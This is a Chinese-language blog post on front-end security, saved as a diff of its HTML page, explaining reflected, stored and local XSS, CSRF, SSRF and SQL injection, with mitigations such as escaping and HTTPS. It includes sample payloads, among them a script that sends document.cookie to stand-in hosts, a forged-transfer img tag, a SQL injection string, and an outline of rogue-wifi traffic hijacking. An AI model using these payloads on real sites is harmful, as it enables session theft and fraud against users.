@@ -1,0 +1,830 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+  
+
+
+  <link rel="alternate" href="/atom.xml" title="Ajun" type="application/atom+xml" />
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.0" />
+
+
+
+
+
+
+<meta name="description" content="XSS攻击XSS（cross-site scripting跨域脚本攻击）攻击是最常见的WEB攻击之一，其重点是“跨域”和“客户端执行”。
+XSS攻击分为三种
+
+Reflected XSS
+Stored XSS
+DOM-based or loacl XSS">
+<meta property="og:type" content="article">
+<meta property="og:title" content="前端安全：XSS和">
+<meta property="og:url" content="https://jasonyan2015.github.io/2017/04/11/前端安全/index.html">
+<meta property="og:site_name" content="Ajun">
+<meta property="og:description" content="XSS攻击XSS（cross-site scripting跨域脚本攻击）攻击是最常见的WEB攻击之一，其重点是“跨域”和“客户端执行”。
+XSS攻击分为三种
+
+Reflected XSS
+Stored XSS
+DOM-based or loacl XSS">
+<meta property="og:image" content="http://images2015.cnblogs.com/blog/555379/201602/555379-20160218233450956-14270563.png">
+<meta property="og:updated_time" content="2017-04-11T12:50:47.106Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="前端安全：XSS和">
+<meta name="twitter:description" content="XSS攻击XSS（cross-site scripting跨域脚本攻击）攻击是最常见的WEB攻击之一，其重点是“跨域”和“客户端执行”。
+XSS攻击分为三种
+
+Reflected XSS
+Stored XSS
+DOM-based or loacl XSS">
+<meta name="twitter:image" content="http://images2015.cnblogs.com/blog/555379/201602/555379-20160218233450956-14270563.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    sidebar: {"position":"left","display":"post","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://jasonyan2015.github.io/2017/04/11/前端安全/"/>
+
+
+
+
+
+  <title> 前端安全：XSS和 | Ajun </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?97e4fd3e134c7f0035f9be5d66f03cf2";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Ajun</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">听说悟净已经植发治好了秃头，有了论及婚嫁的女友。</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="https://jasonyan2015.github.io/2017/04/11/前端安全/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Ajun">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ajun">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                前端安全：XSS和
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-04-11T20:31:51+08:00">
+                2017-04-11
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="XSS攻击"><a href="#XSS攻击" class="headerlink" title="XSS攻击"></a>XSS攻击</h2><p>XSS（cross-site scripting跨域脚本攻击）攻击是最常见的WEB攻击之一，其重点是“<strong>跨域</strong>”和“<strong>客户端执行</strong>”。</p>
+<p>XSS攻击分为三种</p>
+<ul>
+<li>Reflected XSS</li>
+<li>Stored XSS</li>
+<li>DOM-based or loacl XSS</li>
+</ul>
+<a id="more"></a>
+<h3 id="Reflected-XSS"><a href="#Reflected-XSS" class="headerlink" title="Reflected XSS"></a>Reflected XSS</h3><p>基于反射的XSS攻击，主要依靠站点服务端返回脚本，在客户端触发执行从而发起Web攻击。</p>
+<h5 id="例子，做个假设："><a href="#例子，做个假设：" class="headerlink" title="例子，做个假设："></a>例子，做个假设：</h5><ol>
+<li><p>当亚马逊在搜索书籍，搜不到书的时候显示提交的名称。</p>
+</li>
+<li><p>在搜索框搜索内容，填入<code>&lt;script&gt;alert(&#39;handsome boy&#39;)&lt;/script&gt;</code>, 点击搜索。</p>
+</li>
+<li><p>当前端页面没有对返回的数据进行过滤，直接显示在页面上， 这时就会alert那个字符串出来。</p>
+</li>
+<li><p>进而可以构造获取用户cookies的地址，通过QQ群或者垃圾邮件，来让其他人点击这个地址：<br><code>http://www.amazon.cn/search?name=&lt;script&gt;document.location=&#39;http://xxx/get?cookie=&#39;+document.cookie&lt;/script&gt;</code></p>
+</li>
+</ol>
+<h5 id="例子："><a href="#例子：" class="headerlink" title="例子："></a>例子：</h5><p>对于一个图书馆网站book.com</p>
+<p>假设右上角有一个搜索书籍的地方，可以按书名搜索书籍（book.com/search?name=时间简史），于是弹出《时间简史》的相关信息。</p>
+<p>但是如果输入<code>&lt;script&gt;alert(&#39;没有书开个毛线书店啊&#39;)&lt;/script&gt;</code>，假设这个图书馆站点没有对数据做任何过滤，而且会原封不动地把用户输入的数据展示回来，那么返回的页面自然也会返回这段脚本，从而执行它。</p>
+<p>既然要做攻击，我们就要获取用户的数据，要获取数据自然要把信息传回我们的服务器（假设接收信息的地址是<a href="http://vajoy/get），那么可以这样写：" target="_blank" rel="external">http://vajoy/get），那么可以这样写：</a><br><code>&lt;script&gt;document.location=&#39;http://vajoy/get?cookie=&#39;+document.cookie&lt;/script&gt;</code></p>
+<p>不过这样收到的总是我们自己的数据，我们要收集的应该是别人的cookie信息。</p>
+<p>所以之后便可以通过QQ群，或者通过群发垃圾邮件，来让其他人点击这个地址：<br><code>book.com/search?name=&lt;script&gt;document.location=&#39;http://vajoy/get?cookie=&#39;+document.cookie&lt;/script&gt;</code></p>
+<p>这样就可以依靠站点服务端返回脚本，在客户端触发执行从而发起WEB攻击，进行Reflected XSS攻击。</p>
+<h4 id="开发安全措施"><a href="#开发安全措施" class="headerlink" title="开发安全措施"></a>开发安全措施</h4><ol>
+<li><p>前端在显示服务端数据时候，不仅是标签内容需要过滤、转义，就连属性值也都可能需要。</p>
+</li>
+<li><p>后端接收请求时，验证请求是否为攻击请求，攻击则屏蔽。</p>
+</li>
+</ol>
+<h5 id="例如："><a href="#例如：" class="headerlink" title="例如："></a>例如：</h5><p>标签：</p>
+<p><code>&lt;span&gt;&lt;script&gt;alert(&#39;handsome boy&#39;)&lt;/script&gt;&lt;/span&gt;</code></p>
+<p>转义</p>
+<p><code>&lt;span&gt;&amp;lt;script&amp;gt;alert(&amp;#39;handsome boy&amp;#39;)&amp;lt;/script&amp;gt&lt;/span&gt;</code></p>
+<p>属性：</p>
+<p>如果一个input的value属性值是</p>
+<p><code>琅琊榜&quot; onclick=&quot;javascript:alert(&#39;handsome boy&#39;)</code><br>就可能出现</p>
+<p><code>&lt;input type=&quot;text&quot; value=&quot;琅琊榜&quot; onclick=&quot;javascript:alert(&#39;handsome boy&#39;)&quot;&gt;</code></p>
+<p>点击input导致攻击脚本被执行，解决方式可以对script或者双引号进行过滤。</p>
+<h3 id="Stored-XSS"><a href="#Stored-XSS" class="headerlink" title="Stored XSS"></a>Stored XSS</h3><p>基于存储的XSS攻击，是通过发表带有恶意跨域脚本的帖子/文章，从而把恶意脚本存储在服务器，每个访问该帖子/文章的人就会触发执行。</p>
+<h5 id="例子：-1"><a href="#例子：-1" class="headerlink" title="例子："></a>例子：</h5><ol>
+<li><p>发一篇文章，里面包含了恶意脚本</p>
+<p> <code>今天天气不错啊！&lt;script&gt;alert(&#39;handsome boy&#39;)&lt;/script&gt;</code></p>
+</li>
+<li><p>后端没有对文章进行过滤，直接保存文章内容到数据库。</p>
+</li>
+<li><p>当其他看这篇文章的时候，包含的恶意脚本就会执行。</p>
+</li>
+</ol>
+<blockquote>
+<p>因为大部分文章是保存整个HTML内容的，前端显示时候也不做过滤，就极可能出现这种情况。</p>
+</blockquote>
+<h5 id="结论："><a href="#结论：" class="headerlink" title="结论："></a>结论：</h5><p>后端尽可能对提交数据做过滤，在场景需求而不过滤的情况下，前端就需要做些处理了。</p>
+<h5 id="开发安全措施："><a href="#开发安全措施：" class="headerlink" title="开发安全措施："></a>开发安全措施：</h5><ol>
+<li><p>首要是服务端要进行过滤，因为前端的校验可以被绕过。</p>
+</li>
+<li><p>当服务端不校验时候，前端要以各种方式过滤里面可能的恶意脚本，例如script标签，将特殊字符转换成HTML编码。</p>
+</li>
+</ol>
+<h3 id="DOM-based-or-local-XSS"><a href="#DOM-based-or-local-XSS" class="headerlink" title="DOM-based or local XSS"></a>DOM-based or local XSS</h3><p>基于DOM或本地的XSS攻击。一般是提供一个免费的wifi，但是提供免费wifi的网关会往你访问的任何页面插入一段脚本或者是直接返回一个钓鱼页面，从而植入恶意脚本。这种直接存在于页面，无须经过服务器返回就是基于本地的XSS攻击。</p>
+<h5 id="例子1："><a href="#例子1：" class="headerlink" title="例子1："></a>例子1：</h5><ol>
+<li><p>提供一个免费的wifi。</p>
+</li>
+<li><p>开启一个特殊的DNS服务，将所有域名都解析到我们的电脑上，并把Wifi的DHCP-DNS设置为我们的电脑IP。</p>
+</li>
+<li><p>之后连上wifi的用户打开任何网站，请求都将被我们截取到。我们根据http头中的host字段来转发到真正服务器上。</p>
+</li>
+<li><p>收到服务器返回的数据之后，我们就可以实现网页脚本的注入，并返回给用户。</p>
+</li>
+<li><p>当注入的脚本被执行，用户的浏览器将依次预加载各大网站的常用脚本库。</p>
+</li>
+</ol>
+<p>这个其实就是wifi流量劫持，中间人可以看到用户的每一个请求，可以在页面嵌入恶意代码，使用恶意代码获取用户的信息，可以返回钓鱼页面。</p>
+<h5 id="例子2："><a href="#例子2：" class="headerlink" title="例子2："></a>例子2：</h5><ol>
+<li><p>还是提供一个免费wifi</p>
+</li>
+<li><p>在我们电脑上进行抓包</p>
+</li>
+<li><p>分析数据，可以获取用户的微信朋友圈、邮箱、社交网站帐号数据（HTTP）等。</p>
+</li>
+</ol>
+<p><img src="http://images2015.cnblogs.com/blog/555379/201602/555379-20160218233450956-14270563.png" alt=""></p>
+<p>PS：这个是测试在51job页面登录时进行抓包，可以获取帐号密码。</p>
+<p>结论：</p>
+<p>这攻击其实跟网站本身没有什么关系，只是数据被中间人获取了而已，而由于HTTP是明文传输的，所以是极可能被窃取的。</p>
+<p>开发安全措施：</p>
+<ol>
+<li>使用HTTPS！就像《HTTP与HTTPS握手的那些事》这篇文章说的，HTTPS会在请求数据之前进行一次握手，使得客户端与服务端都有一个私钥，服务端用这个私钥加密，客户端用这个私钥解密，这样即使数据被人截取了，也是加密后的数据。</li>
+</ol>
+<p>总结</p>
+<p>XSS攻击的特点就是：尽一切办法在目标网站上执行非目标网站上原有的脚本（某篇文章说的）。本地的XSS攻击的示例2其实不算XSS攻击，只是简单流量劫持。前两种XSS攻击是我们开发时候要注意的，而流量劫持的则可以使用HTTPS提高安全性。</p>
+<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p>CSRF（Cross-site request forgery:跨站请求伪造）攻击者盗用用户的身份，并以其名义发送恶意请求。</p>
+<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>银行网站A，它以GET请求来完成银行转账的操作，如：<code>http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000</code></p>
+<p>危险网站B，它里面有一段HTML的代码如下：</p>
+<pre><code>&lt;img src=http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000&gt;
+</code></pre><p>用户登录了银行网站A，然后访问危险网站B，然后用户的银行账户就少了1000块……</p>
+<p>原因是银行网站A违反了HTTP规范，使用GET请求更新资源。在访问危险网站B的之前，用户已经登录了银行网站A，而B中的<code>&lt;img&gt;</code>以<code>GET</code>的方式请求第三方资源（这里的第三方就是指银行网站了，原本这是一个合法的请求，但这里被不法分子利用了），所以用户的浏览器会带上银行网站A的Cookie发出Get请求，去获取资源<code>http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000</code>，结果银行网站服务器收到请求后，认为这是一个更新资源操作（转账操作），所以就立刻进行转账操作。</p>
+<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p>SSRF(Server-Side Request Forgery:服务器端请求伪造)是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p>
+<h2 id="其他安全问题："><a href="#其他安全问题：" class="headerlink" title="其他安全问题："></a>其他安全问题：</h2><h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p>是提交含有SQL操作语句的信息给后端，后端如果没有做好过滤就执行该语句，攻击者自然可以随意操纵该站点的数据库。</p>
+<p>比如有一个图书馆站点book.com，你点进一本书的详情页面，其url是这样的：</p>
+<p><code>book.com/book?id=100</code></p>
+<p>说明这本书在数据库中的键值是100，后端收到url参数后就执行了数据库查询操作：</p>
+<p><code>select * from booktable where id=&#39;100&#39;</code></p>
+<p>那么如果我们把url更改为</p>
+<p><code>book.com/book?id=100&#39;or&#39;1&#39;=&#39;1</code></p>
+<p>那么数据库操作执行就变成了：</p>
+<p><code>select * from booktable where id=&#39;100&#39;or&#39;1&#39;=&#39;1&#39;</code></p>
+<p>从而取出了整个booktable 表单的全部数据。</p>
+<hr>
+<p>参考链接：</p>
+<ul>
+<li><a href="http://www.cnblogs.com/lovesong/p/5199623.html" target="_blank" rel="external">前端安全之XSS攻击</a></li>
+<li><a href="http://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html" target="_blank" rel="external">浅谈CSRF攻击方式</a></li>
+</ul>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+        
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/04/09/CSS3媒体查询/" rel="next" title="CSS3媒体查询">
+                <i class="fa fa-chevron-left"></i> CSS3媒体查询
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/avatar.gif"
+               alt="Ajun" />
+          <p class="site-author-name" itemprop="name">Ajun</p>
+           
+              <p class="site-description motion-element" itemprop="description">Ajun的前端学习笔记</p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives">
+                <span class="site-state-item-count">6</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              
+                <span class="site-state-item-count">7</span>
+                <span class="site-state-item-name">标签</span>
+              
+            </div>
+          
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+        
+        
+
+        
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS攻击"><span class="nav-number">1.</span> <span class="nav-text">XSS攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Reflected-XSS"><span class="nav-number">1.1.</span> <span class="nav-text">Reflected XSS</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#例子，做个假设："><span class="nav-number">1.1.0.1.</span> <span class="nav-text">例子，做个假设：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#例子："><span class="nav-number">1.1.0.2.</span> <span class="nav-text">例子：</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#开发安全措施"><span class="nav-number">1.1.1.</span> <span class="nav-text">开发安全措施</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#例如："><span class="nav-number">1.1.1.1.</span> <span class="nav-text">例如：</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Stored-XSS"><span class="nav-number">1.2.</span> <span class="nav-text">Stored XSS</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#例子：-1"><span class="nav-number">1.2.0.1.</span> <span class="nav-text">例子：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#结论："><span class="nav-number">1.2.0.2.</span> <span class="nav-text">结论：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#开发安全措施："><span class="nav-number">1.2.0.3.</span> <span class="nav-text">开发安全措施：</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DOM-based-or-local-XSS"><span class="nav-number">1.3.</span> <span class="nav-text">DOM-based or local XSS</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#例子1："><span class="nav-number">1.3.0.1.</span> <span class="nav-text">例子1：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#例子2："><span class="nav-number">1.3.0.2.</span> <span class="nav-text">例子2：</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CSRF"><span class="nav-number">2.</span> <span class="nav-text">CSRF</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#实例"><span class="nav-number">2.1.</span> <span class="nav-text">实例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SSRF"><span class="nav-number">3.</span> <span class="nav-text">SSRF</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#其他安全问题："><span class="nav-number">4.</span> <span class="nav-text">其他安全问题：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SQL注入"><span class="nav-number">4.1.</span> <span class="nav-text">SQL注入</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2017</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Ajun</span>
+</div>
+
+
+<div class="powered-by">
+  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Mist
+  </a>
+</div>
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      
+    </span>
+  
+</div>
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.0"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.0"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
